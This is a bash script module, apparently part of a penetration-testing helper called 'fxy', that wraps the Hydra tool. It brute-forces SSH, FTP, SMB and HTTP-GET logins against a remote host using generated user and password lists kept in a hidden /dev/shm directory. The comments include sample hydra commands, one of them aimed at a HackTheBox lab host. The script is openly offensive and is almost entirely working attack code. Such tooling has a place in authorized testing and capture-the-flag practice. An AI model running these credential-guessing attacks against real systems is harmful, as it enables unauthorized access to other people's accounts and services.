## hydra|brute [help|service] [port] [username]^: hydra brute force (ssh, ftp, smb, http)
# hydra help
if [[ "$1" =~ ^hydra|brute$ ]] && { [ "$#" -eq 1 ] || { [ "$#" -eq 2 ] && [ "$2" == "help" ]; }; }; then
  echo "Available commands for 'hydra':"
  echo "  fxy hydra ssh [port] [username]"
  echo "  fxy hydra ftp [port] [username]"
  echo "  fxy hydra smb [port] [username]"
  echo "  fxy hydra http [port] [username] [subdir]"
  echo -e "\n[i] For more check out: https://book.hacktricks.xyz/brute-force"
  exit
fi

# hydra -I -L user.lst -P pass.lst -u -e sr -s 22333 127.0.0.1 ssh
# hydra -I -L user.lst -P pass.lst -u -e sr -s 21 127.0.0.1 ftp
# hydra -I -L user.lst -P pass.lst -u -e sr -s 445 127.0.0.1 smb
# hydra -L /usr/share/brutex/wordlists/simple-users.txt -P /usr/share/brutex/wordlists/password.lst sizzle.htb.local http-get /certsrv/
if [[ "$1" =~ ^hydra|brute$ ]] && [ "$#" -ge 2 ]; then
  CMD="hydra"
  export INSTCMD="apt install hydra -y"
  checkCmd
  createUserPassLists
  FPATH="/dev/shm/.fxy"
  SUBDIR="" # used for http

  SVC="$2"
  case "$SVC" in
    "ssh")              PORT="-s 22"; SVC="ssh" ;;
    "ftp")              PORT="-s 21"; SVC="ftp" ;;
    "smb")              PORT="-s 445"; SVC="smb" ;;
    "http"|"http-get")  PORT="-s 80"; SVC="http-get"; SUBDIR="/" ;;
    *)                  echo "${warn} Error parsing service to attack!"; exit ;;
  esac

  if [ "$#" -ge 3 ]; then
    if [[ "$3" =~ ^[0-9]+$ ]]; then # is it a number?
      PORT="-s $3"
    else
      echo "${warn} Port is not a number!"; exit
    fi
  fi

  if [ "$#" -ge 4 ]; then
    USRNME="-l $4"
  else
    USRNME="-L $FPATH/user.lst"
  fi

  if [ "$SVC" == "http-get" ] && [ "$#" -ge 5 ]; then
    SUBDIR="$5"
  fi

  CMD="hydra -I $USRNME -P $FPATH/pass.lst -u -e sr $PORT $RHOST $SVC $SUBDIR"
  echo "${bldwht}> $CMD${txtrst}"
  prompt
  bash -c "$CMD"
  exit
fi
